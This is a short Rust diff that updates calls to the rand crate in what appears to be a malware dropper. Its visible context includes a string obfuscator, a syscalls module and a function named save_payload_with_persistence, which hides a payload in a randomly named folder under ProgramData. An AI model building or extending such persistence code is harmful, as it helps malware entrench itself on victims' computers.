@@ -1,7 +1,7 @@
 use crate::syscalls;
 use hex::ToHex;
 use obfuscator::{obfuscate, obfuscate_string};
-use rand::Rng;
+use rand::{thread_rng, Rng};
 use std::ffi::OsStr;
 use std::fs;
 use std::iter::once;
@@ -88,8 +88,8 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
         program_data.pop();
     }
 
-    let mut rng = rand::thread_rng();
-    let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
+    let mut rng = thread_rng();
+    let random_bytes: Vec<u8> = (0..6).map(|_| rng.random::<u8>()).collect();
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
